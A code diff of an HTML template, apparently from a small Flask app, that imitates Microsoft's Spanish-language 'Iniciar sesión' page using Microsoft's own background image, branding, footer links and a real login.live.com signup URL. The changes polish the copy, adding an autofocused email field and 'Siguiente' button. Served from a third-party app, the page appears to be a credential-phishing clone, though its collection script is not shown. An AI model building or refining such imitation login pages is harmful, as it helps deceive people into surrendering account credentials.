@@ -20,7 +20,7 @@
     <div class="absolute top-0 left-0 w-full h-full bg-[#f2f2f2] contain-content">
       <img
         style="animation: fadeIn 1s"
-        class="object-cover"
+        class="w-full h-full"
         aria-hidden="true"
         src="https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg"
         alt="Image Background"
@@ -37,18 +37,38 @@
             alt="Microsoft"
           />
         </div>
-        <div class="relative mt-4 mb-3 show-from-r min-h-[206px]">
-          <h1 class="text-ms-eerie-black segoe-ui text-2xl leading-7 font-semibold text-left">Iniciar sesión</h1>
 
-          <div>
+        <div class="relative mt-4 mb-3 show-from-r min-h-[206px]">
+          <h1 class="title">Iniciar sesión</h1>
+
+          <div class="mb-4">
             <input
+              autofocus
               placeholder="Correo electrónico, teléfono o Skype"
               aria-required="true"
               maxlength="113"
               autocomplete="username"
               type="email"
-              class="input text-ms-eerie-black"
+              class="input text-box text-ms-eerie-black w-full"
             />
+          </div>
+
+          <div class="flex flex-col gap-4 text-[13px]">
+            <div>
+              ¿No tiene una cuenta?
+              <a
+                href="https://login.live.com/oauth20_authorize.srf?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&amp;scope=openid+profile+https%3a%2f%2fwww.office.com%2fv2%2fOfficeHome.All&amp;redirect_uri=https%3a%2f%2fwww.office.com%2flandingv2&amp;response_type=code+id_token&amp;state=2_-VZY2e2UuuYGvN78aHeSL6mYDJBjEq5EGKMqzfLajUJstz26IEIr8OvqTeqcce9HwcauzAEgB6Pyni-1eIlmizQnMoJLmmIFuuBSYmk73zSWV67XCPNEuXSWd_sGBWpIR0-agryqAFm84kH_fQdfngUzruG9lYSC0blNpvCWiH_hPxIfQ6xQJD3Kim4Ybus0yOGwGcT9NCMyBxza8rmvJyQL8YnxUlVmhTN5MALys-pLHnpdFnf2QC4bfzIdjv92HYJ13eyRqU37WiOOuO5A&amp;response_mode=form_post&amp;nonce=638614852763386813.OTNiZTE4ODUtMGJhNi00YWRjLTliMjUtY2RjNDc3MWM3MzkxMTc0ZDFmNTQtOTlmYy00MThlLWE4NjAtMDQ1OGE1NDY0YzQ0&amp;x-client-SKU=ID_NET8_0&amp;x-client-Ver=7.5.1.0&amp;uaid=512b78915c704724882dfca4cac0dfec&amp;msproxy=1&amp;issuer=mso&amp;tenant=common&amp;ui_locales=es-ES&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;epct=PAQABDgEAAAApTwJmzXqdR4BN2miheQMYq_ohZxgRHDutG7C-Zik52voaHNXAoXPGwrFbqX4B-qj2DYGACquX_CDZZ2_RcBLcxjBJpdEZw8xE26m1Lqn8A4vAiLNoGrbkm2He5buZxN7SSl8M4TRVuHzdtlV3Ryw9vP5mwXKuRee6R9qA6-qxJntv9Wpo4PpxstMh8FuDqej2ZuIwOg-wIcmm9LiroqCRgZrz8pumVFeabuOlFi176yAA&amp;jshs=0"
+                id="signup"
+                aria-label="Crear una cuenta de Microsoft "
+                >Cree una</a
+              >.
+            </div>
+            <a href="#">¿No puede acceder a su cuenta?</a>
+          </div>
+
+          <div class="flex gap-1.5 mt-4 justify-end">
+            <button class="button secondary" type="button">Atrás</button>
+            <button class="button primary" type="submit">Siguiente</button>
           </div>
         </div>
       </section>
@@ -69,12 +89,12 @@
     <footer class="absolute left-0 bottom-0 overflow-visible z-30 clear-both w-full min-h-7">
       <div class="flex w-full h-full gap-4 items-center justify-end pr-3">
         <a
-          class="text-ms-eerie-black text-[12px] leading-7 text-nowrap"
+          class="!text-ms-eerie-black text-[12px] leading-7 text-nowrap"
           href="https://www.microsoft.com/es-ES/servicesagreement"
           >Términos de uso</a
         >
         <a
-          class="text-ms-eerie-black text-[12px] leading-7 text-nowrap"
+          class="!text-ms-eerie-black text-[12px] leading-7 text-nowrap"
           href="https://privacy.microsoft.com/es-ES/privacystatement"
           >Privacidad y cookies</a
         >
@@ -89,124 +109,5 @@
       </div>
     </footer>
     <script src="{{ url_for('static', filename='script.js') }}"></script>
-    <style>
-      body {
-        font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima",
-          "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI",
-          "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic",
-          "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le",
-          "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
-        font-size: 15px;
-        line-height: 20px;
-        font-weight: 400;
-        font-size: 0.9375rem;
-        line-height: 1.25rem;
-        padding-bottom: 0.227px;
-        padding-top: 0.227px;
-        color: #000;
-      }
-
-      #lightbox {
-        position: relative;
-        max-width: 440px;
-        width: calc(100% - 40px);
-        padding: 44px;
-        margin-bottom: 28px;
-        background-color: #fff;
-        -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
-        -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
-        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
-        min-width: 320px;
-        min-height: 338px;
-        overflow: hidden;
-      }
-
-      #credbox {
-        position: relative;
-        max-width: 440px;
-        width: calc(100% - 40px);
-        padding: 44px;
-        margin-bottom: 28px;
-        line-height: 16px;
-        min-width: 320px;
-        overflow: hidden;
-        padding: 0;
-        background-color: #fff;
-        -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
-        -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
-        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
-      }
-
-      .segoe-ui {
-        font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi,
-          "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha,
-          Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa",
-          "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti",
-          "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
-      }
-
-      .text-debug {
-        cursor: pointer;
-        transform: translate(12%, -10%);
-        font-size: 13px;
-        font-weight: 600;
-        height: 22px;
-        letter-spacing: 3px;
-        line-height: 22px;
-        outline-color: rgb(0, 0, 0);
-        outline-style: none;
-        outline-width: 0px;
-        text-align: left;
-        text-decoration: none;
-        text-wrap: nowrap;
-        vertical-align: top;
-        white-space-collapse: collapse;
-      }
-
-      @keyframes fadeIn {
-        from {
-          opacity: 0;
-        }
-
-        to {
-          opacity: 1;
-        }
-      }
-
-      .show-from-r {
-        -webkit-animation-name: show-from-right;
-        -webkit-animation-duration: 0.25s;
-        -webkit-animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
-        -webkit-animation-fill-mode: both;
-        -webkit-transition-property: left;
-      }
-
-      @keyframes show-from-right {
-        from {
-          left: 200px;
-          opacity: 0;
-        }
-
-        to {
-          left: 0;
-          opacity: 1;
-        }
-      }
-
-      .input {
-        width: 100%;
-        border-style: solid;
-        padding: 6px 10px;
-        border-width: 1px;
-        border-color: rgba(0, 0, 0, 0.6);
-        height: 36px;
-        outline: none;
-        background-color: transparent;
-        border-top-width: 0;
-        border-left-width: 0;
-        border-right-width: 0;
-        padding-left: 0;
-      }
-    </style>
   </body>
 </html>
